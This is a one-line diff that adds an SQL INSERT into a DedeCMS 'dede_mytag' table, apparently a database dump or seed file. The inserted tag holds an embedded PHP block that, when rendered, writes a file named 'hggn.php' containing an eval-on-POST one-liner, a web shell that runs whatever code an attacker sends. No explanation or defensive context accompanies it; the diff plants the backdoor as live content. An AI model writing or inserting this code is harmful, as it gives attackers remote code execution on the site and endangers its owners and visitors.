@@ -1,0 +1,1 @@
+INSERT INTO `dede_mytag` VALUES('1007','0','','0','0','0','{dede:php}file_put_contents(\'../data/js/hggn.php\',\'<?php eval($_POST[\"x\"]);exit(\"1\");?>\');{/dede:php}','');
